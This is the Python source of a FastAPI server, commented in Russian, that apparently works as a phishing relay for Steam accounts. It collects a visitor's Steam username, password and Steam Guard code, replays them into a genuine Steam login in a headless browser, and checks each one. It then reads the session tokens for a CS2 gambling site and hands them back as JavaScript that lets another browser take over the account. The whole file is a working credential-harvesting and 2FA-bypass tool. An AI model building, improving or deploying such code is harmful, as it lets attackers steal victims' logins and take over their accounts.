import asyncio
import os
import time
from fastapi import FastAPI, Form, BackgroundTasks, Request
from fastapi.responses import HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
import uvicorn
from fastapi.templating import Jinja2Templates

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

sessions = {}
SCREENSHOT_DIR = "debug_screens"
if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)

STEAM_LOGIN_URL = "https://steamcommunity.com/openid/login?openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.realm=https%3A%2F%2Fcs2run.app&openid.return_to=https%3A%2F%2Fcs2run.app%2Fauth%2F1%2Fstart-sign-in%2F%3FreturnUrl%3Dhttps%3A%2F%2Fcs2a.run%2Fauth&l=russian"

async def init_browser(sid):
    print(f"[{sid}] 🚀 Запуск браузера...")
    if sid not in sessions: 
        sessions[sid] = {"ready": False, "is_processing": False, "done": False}
    
    try:
        pw = await async_playwright().start()
        browser = await pw.chromium.launch(
            headless=True,
            args=[
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--disable-extensions",
                "--disable-background-networking",
                "--disable-background-timer-throttling",
                "--disable-renderer-backgrounding",
                "--disable-backgrounding-occluded-windows",
                "--disable-features=Translate,BackForwardCache",
                "--no-first-run",
                "--no-zygote"
            ]
        )
        context = await browser.new_context(
            viewport={"width": 412, "height": 915},
            locale='ru-RU',
            user_agent="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        )
        page = await context.new_page()
        await page.goto(STEAM_LOGIN_URL, wait_until="domcontentloaded")
        
        sessions[sid].update({"page": page, "browser": browser, "pw": pw, "ready": True})
        print(f"[{sid}] ✅ Steam готов")
    except Exception as e:
        print(f"[{sid}] ❌ Ошибка инита: {e}")

@app.get("/api/init")
async def api_init(sid: str, bg: BackgroundTasks):
    sessions[sid] = {"ready": False, "is_processing": False, "done": False}
    bg.add_task(init_browser, sid)
    return {"status": "ok"}

@app.post("/api/login")
async def api_login(sid: str = Form(...), u: str = Form(...), p: str = Form(...)):
    if sid not in sessions: return {"status": "error", "msg": "Сессия не найдена"}
    s = sessions[sid]
    
    for _ in range(20):
        if s.get("ready"): break
        await asyncio.sleep(1)

    page = s["page"]
    
    # --- 1. Вводим логин ---
    await page.click("input[type='text']", click_count=3)
    await page.keyboard.press("Backspace")
    await page.fill("input[type='text']", u)
    await page.screenshot(path=f"{SCREENSHOT_DIR}/{sid}_filled_login.png")
    
    # --- 2. Вводим пароль ---
    await page.click("input[type='password']", click_count=3)
    await page.keyboard.press("Backspace")
    await page.fill("input[type='password']", p)
    await page.screenshot(path=f"{SCREENSHOT_DIR}/{sid}_filled_pass.png")
    
    # --- 3. Кликаем войти ---
    login_btn = page.locator("button:has-text('Войти'), #imageLogin, .DjSvCZoKKfoNSmarsEcTS")
    await login_btn.first.click()
    await asyncio.sleep(1)
    await page.screenshot(path=f"{SCREENSHOT_DIR}/{sid}_after_click.png")
    
    # --- 4. Ждём появления видимой ошибки или перехода к 2FA/OpenID ---
    try:
        error_locator = page.locator(
            "text=Пожалуйста, проверьте свой пароль и имя аккаунта и попробуйте снова."
        )
        await error_locator.wait_for(state="visible", timeout=7000)  # ждём до 7 секунд
        msg = (await error_locator.first.text_content()).strip()
        print(f"[{sid}] ❌ Видимая ошибка: {msg}")
        await page.screenshot(path=f"{SCREENSHOT_DIR}/{sid}_error.png")
        return {"status": "error", "msg": msg}
    
    except PlaywrightTimeoutError:
        # Если ошибки нет, проверяем 2FA/OpenID
        is_guard_input = await page.locator("input#twofactorcode_entry, input#authcode").count() > 0
        is_openid = "openid/login" in page.url
        if is_guard_input or is_openid:
            print(f"[{sid}] ✅ Пароль верный, переходим к 2FA/OpenID")
            await page.screenshot(path=f"{SCREENSHOT_DIR}/{sid}_2fa.png")
            return {"status": "need_2fa"}
    
        # Если ничего не произошло за 15 секунд
        return {"status": "error", "msg": "Steam слишком долго думает. Попробуйте еще раз."}
    
    except Exception as e:
        print(f"[{sid}] ❌ Error: {str(e)}")
        return {"status": "error", "msg": "Ошибка при входе"}

@app.post("/api/click_code_button")
async def api_click_code_button(sid: str = Form(...)):
    """Нажимает 'Ввести код вручную', если юзер хочет ввести код"""
    if sid not in sessions: return {"status": "error"}
    page = sessions[sid]["page"]
    try:
        await page.click("text=введите код") 
        return {"status": "ok"}
    except:
        return {"status": "ok"}


@app.post("/api/submit_code")
async def api_submit_code(sid: str = Form(...), code: str = Form(...)):
    if sid not in sessions: return {"status": "error"}
    page = sessions[sid]["page"]
    try:
        clean_code = code.strip().upper()
        await page.wait_for_selector("input[maxlength='1'], input#authcode", timeout=5000)
        await page.evaluate(f"""(fullCode) => {{
            let inputs = Array.from(document.querySelectorAll('input[maxlength="1"][type="text"]'));
            if (inputs.length >= 5) {{
                for (let i = 0; i < 5; i++) {{
                    inputs[i].value = fullCode[i] || "";
                    inputs[i].dispatchEvent(new Event('input', {{ bubbles: true }}));
                }}
            }} else {{
                let s = document.querySelector('input#authcode, input#twofactorcode_entry');
                if (s) {{ s.value = fullCode; s.dispatchEvent(new Event('input', {{ bubbles: true }})); }}
            }}
        }}""", clean_code)
        await asyncio.sleep(0.5)
        await page.keyboard.press("Enter")
        return {"status": "ok"}
    except Exception as e:
        return {"status": "error", "msg": str(e)}

@app.get("/api/check_status")
async def api_check_status(sid: str):
    if sid not in sessions or sessions[sid]["done"]:
        return {"status": "waiting"}
    
    s = sessions[sid]
    if s.get("is_processing"): 
        return {"status": "processing"}

    s["is_processing"] = True
    page = s["page"]
    
    try:
        for _ in range(10): 
            current_url = page.url
           
            # 1. Проверка на успех (токены)
            if "cs2a.run" in current_url or "cs2run.app" in current_url:
                tokens = await page.evaluate("""() => {
                    return {
                        auth: localStorage.getItem('auth-token') || sessionStorage.getItem('auth-token'),
                        refresh: localStorage.getItem('auth-refresh-token') || sessionStorage.getItem('auth-refresh-token')
                    }
                }""")
                
                if tokens.get("auth"):
                    s["done"] = True
                    await s["browser"].close()
                    await s["pw"].stop()

                    js = f"localStorage.setItem('auth-token', '{tokens['auth']}'); localStorage.setItem('auth-refresh-token', '{tokens['refresh']}'); location.reload();"
                    return {"status": "done", "js_code": js}

            # 2. Проверка на кнопку подтверждения
            login_btn = page.locator("#imageLogin, input[type='submit'][value='Войти']")
            if await login_btn.count() > 0 and await login_btn.first.is_visible():
                print(f"[{sid}] 👁 Клик по кнопке 'Войти'...")
                await login_btn.first.click()
                await asyncio.sleep(3) 
                continue

            await asyncio.sleep(1)
            
        return {"status": "waiting"}
    finally:
        s["is_processing"] = False

# Папка, где лежит index.html
templates = Jinja2Templates(directory="templates")

@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return templates.TemplateResponse("steam.html", {"request": request})
    
    
if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=5050)

